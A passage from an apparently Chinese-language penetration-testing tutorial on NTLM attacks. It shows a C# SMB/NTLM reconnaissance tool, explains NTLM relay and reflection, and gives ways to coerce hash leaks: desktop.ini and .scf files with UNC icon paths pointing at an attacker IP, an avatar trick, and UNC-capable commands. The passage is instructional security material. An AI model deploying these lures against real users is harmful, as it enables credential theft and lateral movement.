class="number">0xFF</span>, <span class="number">0x53</span>, <span class="number">0x4D</span>, <span class="number">0x42</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x18</span>, <span class="number">0x53</span>, <span class="number">0xC8</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xFE</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x50</span>, <span class="number">0x43</span>, <span class="number">0x20</span>, <span class="number">0x4E</span>, <span class="number">0x45</span>, <span class="number">0x54</span>, <span class="number">0x57</span>, <span class="number">0x4F</span>, </span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x4B</span>, <span class="number">0x20</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0x4F</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x31</span>, <span class="number">0x2E</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, </span><br><span class="line">    <span class="number">0x4C</span>, <span class="number">0x41</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, <span class="number">0x4E</span>, <span class="number">0x31</span>, <span class="number">0x2E</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x57</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x6F</span>, </span><br><span class="line">    <span class="number">0x77</span>, <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x20</span>, <span class="number">0x57</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x6B</span>, <span class="number">0x67</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x70</span>, </span><br><span class="line">    <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x33</span>, <span class="number">0x2E</span>, <span class="number">0x31</span>, <span class="number">0x61</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x31</span>, <span class="number">0x2E</span>, <span class="number">0x32</span>, <span class="number">0x58</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, </span><br><span class="line">    <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x4C</span>, <span class="number">0x41</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, <span class="number">0x4E</span>, <span class="number">0x32</span>, <span class="number">0x2E</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x4E</span>, <span class="number">0x54</span>, </span><br><span class="line">    <span class="number">0x20</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x30</span>, <span class="number">0x2E</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line">        <span class="keyword">static</span> <span class="built_in">byte</span>[] d2 =&#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0xFF</span>, <span class="number">0x53</span>, <span class="number">0x4D</span>, <span class="number">0x42</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x18</span>, <span class="number">0x07</span>, <span class="number">0xC8</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xFE</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x41</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA0</span>, <span class="number">0xCF</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, </span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x06</span>, <span class="number">0x06</span>, <span class="number">0x2B</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0xA0</span>, <span class="number">0x3E</span>, <span class="number">0x30</span>, <span class="number">0x3C</span>, <span class="number">0xA0</span>, <span class="number">0x0E</span>, <span class="number">0x30</span>, </span><br><span class="line">    <span class="number">0x0C</span>, <span class="number">0x06</span>, <span class="number">0x0A</span>, <span class="number">0x2B</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x82</span>, <span class="number">0x37</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0xA2</span>, <span class="number">0x2A</span>, <span class="number">0x04</span>, </span><br><span class="line">    <span class="number">0x28</span>, <span class="number">0x4E</span>, <span class="number">0x54</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x53</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x82</span>, <span class="number">0x08</span>, </span><br><span class="line">    <span class="number">0xA2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0xCE</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x00</span>, <span class="number">0x69</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x00</span>, <span class="number">0x77</span>, <span class="number">0x00</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x76</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x37</span>, <span class="number">0x00</span>, <span class="number">0x39</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x76</span>, <span class="number">0x00</span>, <span class="number">0x69</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x6B</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x00</span>, <span class="number">0x69</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x00</span>, <span class="number">0x77</span>, <span class="number">0x00</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x76</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x35</span>, <span class="number">0x00</span>, <span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="built_in">byte</span>[] d3=&#123;</span><br><span class="line"><span class="number">0x81</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,<span class="number">0x20</span>,<span class="number">0x43</span>,<span class="number">0x4b</span>,<span class="number">0x46</span>,<span class="number">0x44</span>,<span class="number">0x45</span>,<span class="number">0x4e</span>,<span class="number">0x45</span>,<span class="number">0x43</span>,<span class="number">0x46</span>,<span class="number">0x44</span>,<span class="number">0x45</span></span><br><span class="line">,<span class="number">0x46</span>,<span class="number">0x46</span>,<span class="number">0x43</span>,<span class="number">0x46</span>,<span class="number">0x47</span>,<span class="number">0x45</span>,<span class="number">0x46</span>,<span class="number">0x46</span>,<span class="number">0x43</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span></span><br><span class="line">,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x00</span>,<span class="number">0x20</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span></span><br><span class="line">,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span></span><br><span class="line">,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x41</span>,<span class="number">0x41</span>,<span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;SMB Version Detection tool 0.1&quot;</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Part of GMH&#x27;s fuck Tools, Code By zcgonvh.\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (args.Length &lt; <span class="number">1</span>) &#123; Console.WriteLine(<span class="string">&quot;usage: smbver host [port]&quot;</span>); <span class="keyword">return</span>; &#125;</span><br><span class="line">            <span class="built_in">string</span> host = args[<span class="number">0</span>];</span><br><span class="line">            <span class="built_in">int</span> port = <span class="number">445</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123; port = <span class="built_in">int</span>.Parse(args[<span class="number">1</span>]); &#125;</span><br><span class="line">            <span class="keyword">catch</span> &#123; &#125;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span>[] buf = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                Socket sock = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">                sock.Connect(host, port);</span><br><span class="line">                <span class="keyword">if</span>(port==<span class="number">139</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                  sock.Send(d3);</span><br><span class="line">                  sock.Receive(buf);</span><br><span class="line">                &#125;</span><br><span class="line">                sock.Send(d1);</span><br><span class="line">                sock.Receive(buf);</span><br><span class="line">                sock.Send(d2);</span><br><span class="line">                sock.Receive(buf);</span><br><span class="line">                <span class="built_in">int</span> len = BitConverter.ToInt16(buf, <span class="number">43</span>);</span><br><span class="line">                <span class="built_in">string</span>[] ss = Encoding.Unicode.GetString(buf, len + <span class="number">47</span>, buf.Length - len - <span class="number">47</span>).Split(<span class="string">&#x27;\0&#x27;</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;native os: &quot;</span> + ss[<span class="number">0</span>]);</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;native lan manager: &quot;</span> + ss[<span class="number">1</span>]);</span><br><span class="line">                <span class="built_in">int</span> off = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">47</span>; i &lt; len - <span class="number">7</span>; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (buf[i] == <span class="string">&#x27;N&#x27;</span> &amp;&amp; buf[i + <span class="number">1</span>] == <span class="string">&#x27;T&#x27;</span> &amp;&amp; buf[i + <span class="number">2</span>] == <span class="string">&#x27;L&#x27;</span> &amp;&amp; buf[i + <span class="number">3</span>] == <span class="string">&#x27;M&#x27;</span> &amp;&amp; buf[i + <span class="number">4</span>] == <span class="string">&#x27;S&#x27;</span> &amp;&amp; buf[i + <span class="number">5</span>] == <span class="string">&#x27;S&#x27;</span> &amp;&amp; buf[i + <span class="number">6</span>] == <span class="string">&#x27;P&#x27;</span>) &#123; off = i; <span class="keyword">break</span>; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">byte</span>[] ntlm = <span class="keyword">new</span> <span class="built_in">byte</span>[len];</span><br><span class="line">                Array.Copy(buf, off, ntlm, <span class="number">0</span>, len);</span><br><span class="line">                len = BitConverter.ToInt16(ntlm, <span class="number">0xc</span>);</span><br><span class="line">                off = BitConverter.ToInt16(ntlm, <span class="number">0x10</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;negotiate target: &quot;</span> + Encoding.Unicode.GetString(ntlm, off, len));</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;os major version: &quot;</span> + ntlm[off - <span class="number">8</span>]);</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;os minor version: &quot;</span> + ntlm[off - <span class="number">7</span>]);</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;os build number: &quot;</span> + BitConverter.ToInt16(ntlm, off - <span class="number">6</span>));</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;ntlm current revision: &quot;</span> + ntlm[off - <span class="number">1</span>]);</span><br><span class="line">                off += len;</span><br><span class="line">                <span class="built_in">int</span> type = BitConverter.ToInt16(ntlm, off);</span><br><span class="line">                <span class="keyword">while</span> (type != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    off += <span class="number">2</span>;</span><br><span class="line">                    len = BitConverter.ToInt16(ntlm, off);</span><br><span class="line">                    off += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">switch</span> (type)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(<span class="string">&quot;NetBIOS computer name: &quot;</span> + Encoding.Unicode.GetString(ntlm, off, len));</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(<span class="string">&quot;NetBIOS domain name: &quot;</span> + Encoding.Unicode.GetString(ntlm, off, len));</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(<span class="string">&quot;DNS computer name: &quot;</span> + Encoding.Unicode.GetString(ntlm, off, len));</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(<span class="string">&quot;DNS domain name: &quot;</span> + Encoding.Unicode.GetString(ntlm, off, len));</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(<span class="string">&quot;DNS tree name: &quot;</span> + Encoding.Unicode.GetString(ntlm, off, len));</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(<span class="string">&quot;time stamp: &#123;0:o&#125;&quot;</span>, DateTime.FromFileTime(BitConverter.ToInt64(ntlm, off)));</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        <span class="literal">default</span>:</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.Write(<span class="string">&quot;Unknown type &#123;0&#125;, data: &quot;</span>, type);</span><br><span class="line">                                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">                                &#123;</span><br><span class="line">                                    Console.Write(ntlm[i + off].ToString(<span class="string">&quot;X2&quot;</span>));</span><br><span class="line">                                &#125;</span><br><span class="line">                                Console.WriteLine();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    off += len;</span><br><span class="line">                    type = BitConverter.ToInt16(ntlm, off);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;err: &quot;</span> + ex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>效果展示图是这样的</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01299ecabe2d3f6a3c.png"></p>
<p>msf底下也有类似的模块<code>auxiliary/scanner/smb/smb_version</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01196b6db158cce01b.png"></p>
<h4 id="ntlm-relay"><a href="#ntlm-relay" class="headerlink" title="ntlm relay"></a>ntlm relay</h4><p>Hot Potato，2018-8581,2019-1040相信大家也都不陌生了，这其中都有ntlm_relay的影子。作为一个在上世纪就被提出的安全问题，时至2019的今天，ntlm_relay仍然在远程命令执行。横向扩展，权限提升等方面发挥着巨大的作用。本块剩余部门简单的介绍一些ntlm_relay相关的概念。</p>
<ol>
<li>ntlm_relay 的一般过程</li>
</ol>
<p>先回顾下之前ntlm 认证的 type1,type2,type 3</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d47ced6da3ce3023.png"></p>
<p>那如果这个时候有个中间的攻击者出现</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f5ae5c28ca852618.png"></p>
<p>看图已经能够很清晰得理解ntlm_relay的一般过程，作为中间人，攻击者将来自客户端的包(type 1)转发给服务端，将来自服务端的challenge(type 2)转发给客户端，然后客户端计算完response 之后，再把response(type 3) 转发给服务端，服务端验证rsponse通过之后，授予攻击者访问的权限。</p>
<p>我们抓包查看整个过程跟上图差不多(其中Attacker是172.16.100.1,Inventory Server是172.16.100.5，Target是172.16.100.128)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ec1e2cab2a8e0b3c.png"></p>
<ol start="2">
<li>ntlm_relay or smb_relay<br>我们之前反复在说一件事,ntlm是一个嵌入式的协议，消息的传输依赖于使用ntlm的上层协议，比如SMB,LDAP,HTTP等。我们通过查看包就可以很清楚的看到这一点。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b6e98cb5e95a7daf.png"></p>
<p>那ntlm的上层协议是smb的情况下,ntlm_relay就是smb_relay。那如果上层协议是http，我们也可以叫做http_relay，但是都统称ntlm_relay，因此，后面统一用ntlm_relay，就不再纠结这个字样了。</p>
<ol start="3">
<li>跨协议的relay</li>
</ol>
<p>又是我们之前反复强调的一个点,ntlm是一个嵌入式的协议，消息的传输依赖于使用ntlm的上层协议，比如SMB,LDAP,HTTP等,那不管上层协议是啥，ntlm的认证总归是type 1,type 2,type3 。所以我们</p>
<p>就不局限于之前提到的smb到smb这种relay，可以在一个协议里面提取ntlm认证信息，放进另外一个协议里面，实现跨协议的relay。</p>
<ol start="4">
<li>relay or reflet</li>
</ol>
<p>再看看relay的这种图</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019485250451f76496.png"></p>
<p>如上图，如果Inventory Server和Target是同一台机子，那么也就是说我们攻击者拿到Inventory Server发来的请求之后，发回给Inventory Server进行认证。这个就是reflect。在工作组环境里面，工作组中的机器之间相互没有信任关系，每台机器的账号密码只是保存在自己的SAM文件中，这个时候relay到别的机器，除非两台机器的账号密码一样，不然没有别的意义了，这个时候的攻击手段就是将机器reflect回机子本身。因此微软在ms08-068中对smb reflect到smb 做了限制。CVE-2019-1384(Ghost Potato)就是绕过了该补丁。</p>
<ol start="5">
<li>挖掘ntlm_relay的一般方法</li>
</ol>
<p>如何触发Inventory Server 向Attacker发起请求，将在下一部分里面详细阐述<br>Attacker拿到请求之后，是进行ntlm ntlm破解还是选择进行relay，relay的话，可以跨协议relay，那relay到不同的协议能起到什么作用，将在下下章节里面详细阐述。</p>
<h2 id='p5'>发起NTLM请求</h2>

<h3 id="前言-5"><a href="#前言-5" class="headerlink" title="前言"></a>前言</h3><p>这篇块是ntlm篇的第二大章，怎么发起ntlm请求。在 阅读这部分之前，有两点说明</p>
<ol>
<li>这块的主要内容是使服务器向攻击者发起ntlm 请求，但是没有进一步利用，因此本篇文件的表述都是获得net-ntlm hash。使用Responder来捕获。Responder的用法可自行搜索。这里不展开。</li>
<li>有些地方较为敏感，因此使用的net-ntlm hash的截图并非真实图片。这个地方不重要，主要证明能发起请求就行，出现net-ntlm hash 截图的地方都是本地测试，真实收到请求的。</li>
</ol>
<h3 id="图标"><a href="#图标" class="headerlink" title="图标"></a>图标</h3><h4 id="desktop-ini"><a href="#desktop-ini" class="headerlink" title="desktop.ini"></a>desktop.ini</h4><p>文件夹底下都有个文件desktop.ini来指定文件夹图标之类的。默认不可见。去掉隐藏受保护的操作系统文件就可以看到</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016e954df14239888c.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017613e6801d46b8d2.png"></p>
<p>每个文件夹底下都会有，我们新建一个新的文件夹的话，如果没看到desktop.ini，可以尝试更改图标，就可以看到了。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011f619e477ffa9eaa.png"></p>
<p>将图标路径改成UNC路径，指向我们的服务器</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010a77d8e5b5f30c57.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015d257a6f54d235c2.png"></p>
<p>当用户访问该文件夹的时候会去访问UNC路径,我们就能获取用户的net-ntlm hash。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0177cb454b7fb7506e.png"></p>
<h4 id="scf-文件"><a href="#scf-文件" class="headerlink" title="scf 文件"></a>scf 文件</h4><p>只要一个文件底下含有scf后缀的文件,由于scf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标。而IconFile是支持UNC路径的。以下是scf后缀的文件的格式</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=<span class="number">2</span></span><br><span class="line">IconFile=\\<span class="number">172.16</span><span class="number">.100</span><span class="number">.1</span>\scf\test.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure>

<p>新建test.scf，写入内容，放在一个文件夹底下，当用户访问该文件夹的时候，我们就会获得用户的net-ntlm hash。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b937f566307adb94.png"></p>
<h4 id="用户头像"><a href="#用户头像" class="headerlink" title="用户头像"></a>用户头像</h4><p>适用于Windows 10&#x2F;2016&#x2F;2019</p>
<p>在更改账户图片处。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019c8338b41bc63f6a.png"></p>
<p>用普通用户的权限指定一个webadv地址的图片，如果普通用户验证图片通过，那么SYSTEM用户(域内是机器用户)也去访问172.16.100.180，并且携带凭据，我们就可以拿到机器用户的net-ntlm hash，这个可以用来提权。后面会详细讲。</p>
<h3 id="系统命令携带UNC路径"><a href="#系统命令携带UNC路径" class="headerlink" title="系统命令携带UNC路径"></a>系统命令携带UNC路径</h3><p>这个比较鸡肋，都能执行命令了，干啥不行呢。但作为一种场景，也说明下。说不定有些限制的命令注入就是支持传进UNC路径呢。我平时在测试的时候一般都是用 dir \ip\xxx来做测试的，很多cmd命令是支持传进UNC路径的，执行的时候我们就可以拿到用户的net-ntlm hash了。至于有哪些命令。这一块总结了一些命令,总结得挺全面的。 <a href="https://www.anquanke.com/post/id/177123">内网渗透——针对hash的攻击</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; net.exe use \hostshare </span><br><span class="line">&gt; attrib.exe \hostshare  </span><br><span class="line">&gt; bcdboot.exe \hostshare  </span><br><span class="line">&gt; bdeunlock.exe \hostshare  </span><br><span class="line">&gt; cacls.exe \hostshare  </span><br><span class="line">&gt; certreq.exe \hostshare <span class="comment">#(noisy, pops an error dialog) </span></span><br><span class="line">&gt; certutil.exe \hostshare  </span><br><span class="line">&gt; cipher.exe \hostshare  </span><br><span class="line">&gt; ClipUp.exe <span class="literal">-l</span> \hostshare  </span><br><span class="line">&gt; cmdl32.exe \hostshare  </span><br><span class="line">&gt; cmstp.exe /s \hostshare  </span><br><span class="line">&gt; colorcpl.exe \hostshare <span class="comment">#(noisy, pops an error dialog)  </span></span><br><span class="line">&gt; comp.exe /N=<span class="number">0</span> \hostshare \hostshare  </span><br><span class="line">&gt; compact.exe \hostshare  </span><br><span class="line">&gt; control.exe \hostshare  </span><br><span class="line">&gt; convertvhd.exe <span class="literal">-source</span> \hostshare <span class="literal">-destination</span> \hostshare  </span><br><span class="line">&gt; Defrag.exe 